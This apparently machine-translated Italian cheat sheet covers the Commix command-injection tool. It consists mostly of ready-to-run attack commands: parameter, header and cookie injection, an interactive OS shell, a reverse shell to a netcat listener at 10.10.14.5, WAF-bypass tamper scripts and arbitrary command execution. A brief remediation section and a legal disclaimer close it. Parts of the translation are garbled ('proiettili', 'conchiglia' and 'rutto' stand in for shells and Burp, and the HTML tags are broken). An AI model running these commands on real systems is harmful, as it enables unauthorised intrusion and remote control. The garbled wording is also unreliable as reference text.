<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💉 Comix - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```
<palign="centro">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sicurezza Web">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licenza GPLv3">
</p>

<palign="centro">
  <b>🌐 Strumento automatizzato progettato per rilevare e sfruttare le vulnerabilità di Command Injection nelle applicazioni Web e generare shell interattive</b>
</p>

---

## 📋 Sommario

- [Panoramica e la primitiva di Command Injection](#-overview--the-command-injection-primitive)
- [Installazione](#-installazione)
- [Scansione di base delle vulnerabilità](#-basic-vulnerability-scanning)
- [Inserimento di elementi HTTP diversi](#-injecting-different-http-elements)
  - [OTTIENI parametri](#get-parametri)
  - [Dati POST (`--data`)](#dati post---dati)
  - [Intestazioni e cookie HTTP](#http-headers--cookie)
- [Generazione di shell interattive e inverse](#-spawning-interactive--reverse-shell)
  - [Pseudo-shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Shell inversa nativa (`--reverse-ip`)](#shell-inversa-nativa---ip-inverso)
- [Script di evasione e manomissione WAF (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [Tecniche di cieco basate su file e basate sul tempo](#-tecniche di cieco basate su file--basate sul tempo)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e riparazione](#-considerazioni-difensive--riparazione)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e la primitiva di Command Injection

Mentre **SQLMap** automatizza l'SQL injection, **Commix** (creato da **Anastasios Stasinopoulos**) è lo standard di riferimento per trovare e sfruttare i difetti di **OS Command Injection**.

Quando le applicazioni web trasmettono in modo non sicuro gli input dell'utente direttamente alle funzioni di esecuzione del sistema operativo (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), gli aggressori possono aggiungere comandi shell arbitrari. Commix rileva automaticamente i vettori di iniezione cieca basata sui risultati, basata sull'output, basata sul tempo e basata su file.

---

## 📥Installazione
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```
---

## 🚀 Scansione di base delle vulnerabilità
```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```
---

## 🔍 Inserimento di diversi elementi HTTP

### OTTIENI parametri
Utilizza il tag `INJECT_HERE` se esistono più parametri:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```
### Dati POST (`--data`)
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```
### Intestazioni e cookie HTTP
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```
---

## 💀 Generazione di proiettili interattivi e inversi

### Pseudo-conchiglia (`--os-shell`)

Una volta confermata l'iniezione, Commix fornisce uno pseudo-terminale emulato direttamente all'interno della console:
```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```
### Shell inversa nativa (`--reverse-ip`)

Indica a Commix di rilasciare una connessione TCP inversa completamente interattiva al tuo ascoltatore Netcat:
```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```
---

## 🥷 Script di evasione e manomissione WAF (`--tamper`)

Bypassare i Web Application Firewall (WAF) e le blacklist di stringhe utilizzando la manomissione dell'offuscamento integrata:
```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```
---

## ⏱️ Tecniche di Blind basate su file e basate sul tempo

Quando l'output non viene restituito nella risposta HTTP:
```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Scansione parametro GET** | `commix -u "<URL>?param=val"` |
| **Scansione parametro POST** | `commix -u "<URL>" --data="param=val"` |
| **Scansione batch non interattiva** | `commix -u "<URL>" --batch` |
| **Shell terminale interattivo**| `commix -u "<URL>" --os-shell` |
| **Rilascia guscio inverso** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
| **Richiesta di riproduzione del rutto** | `commix -r burp_request.req` |
| **Usa manomissione spazio** | `commix -u "<URL>" --tamper=space2ifs` |
| **Esegui comando singolo** | `commix -u "<URL>" --os-cmd="whoami; id"` |

---

## 🛡️ Considerazioni difensive e rimedi

1. **Evita l'esecuzione della shell del sistema operativo:** Non concatenare mai gli input dell'utente non disinfettati in `system()`, `exec()` o nei comandi della shell.
2. **Utilizza API in linguaggio nativo:** sostituisci le utilità di sistema con librerie del linguaggio di programmazione nativo (ad esempio, utilizza la libreria `socket` di Python anziché eseguire il file binario `ping` di sistema).
3. **Whitelist rigorosa:** se l'input dell'utente deve dettare l'esecuzione del programma, convalidare l'input rispetto a una whitelist alfanumerica rigorosa prima dell'invocazione.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Comix automatizza l'esecuzione di comandi arbitrari sui server di destinazione. Il fuzzing o lo sfruttamento di applicazioni web non autorizzate è illegale. Utilizzare solo su sistemi dove si possiede esplicita autorizzazione scritta.